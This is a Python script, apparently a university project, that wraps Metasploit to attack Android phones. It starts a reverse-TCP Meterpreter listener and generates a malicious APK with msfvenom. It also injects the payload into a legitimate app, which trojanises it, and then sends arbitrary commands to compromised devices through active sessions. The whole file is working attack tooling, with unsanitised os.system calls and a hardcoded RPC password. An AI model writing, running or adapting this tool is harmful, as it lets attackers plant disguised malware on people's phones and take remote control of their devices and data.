import os
from pymetasploit3.msfrpc import MsfRpcClient

def main():
    # first i make the asciart with https://www.asciiart.eu/text-to-ascii-art
    ascii_art = """
    ****************************************************************************************************
    *  _   _ _   _ _____     _______ ____  ____ ___ _______   __   ___  _____   _  ___   _ _____ _     *
    * | | | | \ | |_ _\ \   / / ____|  _ \/ ___|_ _|_   _\ \ / /  / _ \|  ___| | |/ / | | |  ___/ \    *
    * | | | |  \| || | \ \ / /|  _| | |_) \___ \| |  | |  \ V /  | | | | |_    | ' /| | | | |_ / _ \   *
    * | |_| | |\  || |  \ V / | |___|  _ < ___) | |  | |   | |   | |_| |  _|   | . \| |_| |  _/ ___ \  *
    *  \___/|_| \_|___|  \_/  |_____|_| \_\____/___| |_|   |_|    \___/|_|     |_|\_\\___/|_|/_/   \_\ *
    ****************************************************************************************************
                             by Dr.Salah Abd Alhadi  & Mohammad Abbas Shareef
    """
    #then print it
    print(ascii_art)
    #two primary veriable will setting in (choose number 1)
    lhost = None
    lport = None
    #our sesions with metasploit set when Start Metasploit listener (choose number 2)
    client = None

    while True:
        print("\nPlease choose an option:")
        print("1. Set your host and port")
        print("2. Start Metasploit listener")
        print("3. Generate APK payload")
        print("4. Inject APK payload")
        print("5. List active sessions")
        print("6. Interact with a session")
        print("7. Exit")
        choice = input("\nEnter your choice: ")

        if choice == '1':
            lhost = input("Enter your host ")
            lport = input("Enter your port")
            print("your host :",lhost)
            print("your port :",lport)

        elif choice == '2':
            #here we will connect to metasploit RPC (Remote Procedure Call)
            #we should run the server by write the comand in terminal
            #msfconsole -x "load msgrpc ServerHost=127.0.0.1 ServerPort=4444 User=msf Pass=12345678"
            client = MsfRpcClient('12345678', port=4444)
            #bellow we will use multi/handler it is metasploit model to handle incoming conections
            exploit = client.modules.use('exploit', 'multi/handler')
            #then we use reverse_tcp to wait other side conection back
            payload = client.modules.use('payload', 'android/meterpreter/reverse_tcp')
            # set host and port
            payload['LHOST'] = lhost
            payload['LPORT'] = lport
            # execute above details
            exploit.execute(payload=payload)
            print("Our tool started listening")

        elif choice == '3':
                #we use msfvenom tool to generate apk
                fname = input("enter name of file with .apk")
                os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} R > {fname}")

        elif choice == '4':
            original_apk = input("Enter original APK path and name (with .apk): ")
            output_apk = input("Enter output APK path and name (with .apk): ")
            if lhost and lport:
                os.system(f"msfvenom -x {original_apk} -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o {output_apk}")
                print(f"Injected payload into {original_apk} and saved as {output_apk}")
            else:
                print("Please set LHOST and LPORT first (option 1).")

        elif choice == '5':
            sessions = client.sessions.list
            if not sessions:
                print("there are not active sessions found")
            else:
                print("active session ")
                for session_id, details in sessions.items():
                    print(f"id- {session_id}, device-: {details['info']}")

        elif choice == '6':
                session_id = input("enter the session id : ")
                session = client.sessions.session(session_id)
                print(f"Interacting with session {session_id}")
                #to manege session and pass coamand to the devide
                while True:
                    command = input("meterpreter> ")
                    if command == "exit":
                        break
                    else:
                        output = session.run_with_output(command)
                        print(output)

        elif choice == '7':
            print("Good bye")
            break

        else:
            print("please choise correct one")


if __name__ == "__main__":
    main()
